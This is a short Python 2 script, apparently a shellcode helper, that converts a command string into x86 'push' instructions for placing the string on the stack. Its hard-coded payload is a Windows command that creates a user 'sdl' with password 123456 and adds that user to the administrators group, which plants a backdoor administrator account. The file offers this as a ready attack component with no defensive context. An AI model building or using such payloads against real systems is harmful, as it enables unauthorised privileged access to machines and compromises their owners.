#coding=utf-8
import sys
'''
if len(sys.argv)!=2:
	print "arg error.\nexample:python",sys.argv[0],"whoami"
	exit()
str=sys.argv[1]
'''
arch=4#x86:4,x64:8
str="net user sdl 123456 /add&&net localgroup administrators sdl /add"
#str="abcde"
hexs=map(hex,map(ord,str))
padding=len(hexs)%arch #尾部不需要填充0的数量,即余数的数量
nopadding=arch-padding #需要填充0的数量
if padding==0:
	print "push  0"
else:
	last=[]
	for i in range(0,nopadding):
		last.append("0x00")
	for i in range(0,padding):
		last.append(hexs.pop())
	last="".join(last).replace("0x","")
	print "push ",last
while len(hexs)>0:
	unit=[]
	for i in range(0,arch):
		unit.append(hexs.pop())
	unit="".join(unit).replace("0x","")
	print "push ",unit